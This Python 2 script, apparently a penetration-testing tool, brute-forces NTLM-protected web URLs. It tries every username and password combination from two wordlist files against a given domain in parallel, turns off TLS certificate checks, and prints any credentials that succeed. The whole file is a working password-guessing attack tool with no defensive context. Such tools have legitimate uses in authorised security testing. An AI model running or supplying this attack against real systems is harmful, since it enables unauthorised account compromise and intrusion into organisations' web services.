#!/usr/bin/env python

import requests
from requests_ntlm import HttpNtlmAuth
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue, domain):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        user = '{0}\\{1}'.format(domain, creds[0])
        auth = HttpNtlmAuth(user, creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 200:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return
        else:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print 'USAGE: brute_http_ntlm.py url userfile passfile domain'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue,
                                                         sys.argv[4]))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(sys.argv[3]):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

